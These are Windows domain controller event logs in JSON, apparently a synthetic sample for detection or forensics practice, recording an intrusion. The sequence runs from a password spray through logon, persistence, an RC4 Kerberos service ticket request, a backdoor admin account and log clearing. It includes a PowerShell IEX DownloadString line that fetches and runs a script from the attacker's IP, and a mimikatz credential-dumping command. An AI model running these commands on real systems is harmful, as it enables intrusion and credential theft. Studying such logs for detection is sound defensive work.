{"EventID": 4625, "EventTime": "2026-02-10 03:02:01", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "administrator", "LogonType": "3", "IpAddress": "91.240.118.29", "SubStatus": "0xC000006A", "WorkstationName": "KALI", "Severity": "INFO", "Message": "An account failed to log on."}
{"EventID": 4625, "EventTime": "2026-02-10 03:02:04", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "jsmith", "LogonType": "3", "IpAddress": "91.240.118.29", "SubStatus": "0xC000006A", "WorkstationName": "KALI", "Severity": "INFO", "Message": "An account failed to log on."}
{"EventID": 4625, "EventTime": "2026-02-10 03:02:07", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "mmeyer", "LogonType": "3", "IpAddress": "91.240.118.29", "SubStatus": "0xC000006A", "WorkstationName": "KALI", "Severity": "INFO", "Message": "An account failed to log on."}
{"EventID": 4625, "EventTime": "2026-02-10 03:02:10", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "backup", "LogonType": "3", "IpAddress": "91.240.118.29", "SubStatus": "0xC000006A", "WorkstationName": "KALI", "Severity": "INFO", "Message": "An account failed to log on."}
{"EventID": 4625, "EventTime": "2026-02-10 03:02:13", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "svc_backup", "LogonType": "3", "IpAddress": "91.240.118.29", "SubStatus": "0xC000006A", "WorkstationName": "KALI", "Severity": "INFO", "Message": "An account failed to log on."}
{"EventID": 4625, "EventTime": "2026-02-10 03:03:01", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "admin2", "LogonType": "3", "IpAddress": "91.240.118.29", "SubStatus": "0xC0000064", "WorkstationName": "KALI", "Severity": "INFO", "Message": "An account failed to log on."}
{"EventID": 4625, "EventTime": "2026-02-10 03:03:04", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "test", "LogonType": "3", "IpAddress": "91.240.118.29", "SubStatus": "0xC0000064", "WorkstationName": "KALI", "Severity": "INFO", "Message": "An account failed to log on."}
{"EventID": 4625, "EventTime": "2026-02-10 03:03:07", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "scanner", "LogonType": "3", "IpAddress": "91.240.118.29", "SubStatus": "0xC0000064", "WorkstationName": "KALI", "Severity": "INFO", "Message": "An account failed to log on."}
{"EventID": 4625, "EventTime": "2026-02-10 03:03:10", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "temp", "LogonType": "3", "IpAddress": "91.240.118.29", "SubStatus": "0xC0000064", "WorkstationName": "KALI", "Severity": "INFO", "Message": "An account failed to log on."}
{"EventID": 4625, "EventTime": "2026-02-10 03:03:13", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "printer", "LogonType": "3", "IpAddress": "91.240.118.29", "SubStatus": "0xC0000064", "WorkstationName": "KALI", "Severity": "INFO", "Message": "An account failed to log on."}
{"EventID": 4624, "EventTime": "2026-02-10 03:05:20", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "svc_backup", "LogonType": "3", "IpAddress": "91.240.118.29", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "Severity": "INFO", "Message": "An account was successfully logged on."}
{"EventID": 4624, "EventTime": "2026-02-10 03:06:02", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "svc_backup", "LogonType": "10", "IpAddress": "91.240.118.29", "AuthenticationPackageName": "Negotiate", "WorkstationName": "KALI", "Severity": "INFO", "Message": "An account was successfully logged on."}
{"EventID": 4672, "EventTime": "2026-02-10 03:06:05", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "SubjectUserName": "svc_backup", "PrivilegeList": "SeDebugPrivilege\n\t\tSeBackupPrivilege\n\t\tSeRestorePrivilege", "Severity": "INFO", "Message": "Special privileges assigned to new logon."}
{"EventID": 4688, "EventTime": "2026-02-10 03:07:11", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "SubjectUserName": "svc_backup", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=", "Severity": "INFO", "Message": "A new process has been created."}
{"EventID": 4104, "EventTime": "2026-02-10 03:07:15", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-PowerShell", "SubjectUserName": "svc_backup", "Severity": "INFO", "Message": "IEX (New-Object Net.WebClient).DownloadString('http://91.240.118.29/stage2.ps1')"}
{"EventID": 4663, "EventTime": "2026-02-10 03:09:30", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "SubjectUserName": "svc_backup", "ObjectName": "C:\\Windows\\System32\\config\\SAM", "ProcessName": "C:\\Users\\svc_backup\\AppData\\Roaming\\winupd.exe", "Severity": "INFO", "Message": "An attempt was made to access an object."}
{"EventID": 4698, "EventTime": "2026-02-10 03:11:04", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "SubjectUserName": "svc_backup", "TaskName": "\\Microsoft\\Windows\\UpdateHealthCheck", "Severity": "INFO", "Message": "A scheduled task was created."}
{"EventID": 4697, "EventTime": "2026-02-10 03:11:40", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "SubjectUserName": "svc_backup", "ServiceName": "WinUpdateSvc", "ImagePath": "C:\\Users\\svc_backup\\AppData\\Roaming\\winupd.exe", "Severity": "INFO", "Message": "A service was installed in the system."}
{"EventID": 4657, "EventTime": "2026-02-10 03:12:10", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "SubjectUserName": "svc_backup", "ObjectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\winupd", "Severity": "INFO", "Message": "A registry value was modified."}
{"EventID": 4688, "EventTime": "2026-02-10 03:12:18", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "SubjectUserName": "svc_backup", "NewProcessName": "C:\\Users\\svc_backup\\AppData\\Roaming\\mimikatz.exe", "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "mimikatz.exe \"sekurlsa::logonpasswords\" exit", "Severity": "INFO", "Message": "A new process has been created."}
{"EventID": 4768, "EventTime": "2026-02-10 03:14:02", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "svc_backup", "IpAddress": "91.240.118.29", "Severity": "INFO", "Message": "A Kerberos authentication ticket (TGT) was requested."}
{"EventID": 4769, "EventTime": "2026-02-10 03:14:09", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "svc_backup", "IpAddress": "91.240.118.29", "TicketEncryptionType": "0x17", "ServiceName": "MSSQLSvc/sql01.corp.local", "Severity": "INFO", "Message": "A Kerberos service ticket was requested."}
{"EventID": 4720, "EventTime": "2026-02-10 03:16:33", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "helpdesk2", "SubjectUserName": "svc_backup", "Severity": "INFO", "Message": "A user account was created."}
{"EventID": 4732, "EventTime": "2026-02-10 03:17:05", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "TargetUserName": "Administrators", "MemberName": "CN=helpdesk2,CN=Users,DC=corp,DC=local", "SubjectUserName": "svc_backup", "Severity": "INFO", "Message": "A member was added to a security-enabled local group."}
{"EventID": 4719, "EventTime": "2026-02-10 03:21:12", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Security-Auditing", "SubjectUserName": "svc_backup", "SubcategoryGuid": "{0CCE9248-69AE-11D9-BED3-505054503030}", "Severity": "INFO", "Message": "System audit policy was changed."}
{"EventID": 1102, "EventTime": "2026-02-10 03:22:47", "Channel": "Security", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Eventlog", "SubjectUserName": "svc_backup", "Severity": "INFO", "Message": "The audit log was cleared."}
{"EventID": 22, "EventTime": "2026-02-10 03:07:14", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Sysmon", "SubjectUserName": "svc_backup", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "QueryName": "cdn-update.top", "Severity": "INFO", "Message": "Dns query: QueryName=cdn-update.top"}
{"EventID": 1116, "EventTime": "2026-02-10 03:12:20", "Channel": "Microsoft-Windows-Windows Defender/Operational", "Hostname": "dc01.corp.local", "SourceName": "Microsoft-Windows-Windows Defender", "Severity": "WARN", "Message": "Windows Defender detected malware: HackTool:Win64/Mikatz!dha in C:\\Users\\svc_backup\\AppData\\Roaming\\mimikatz.exe"}
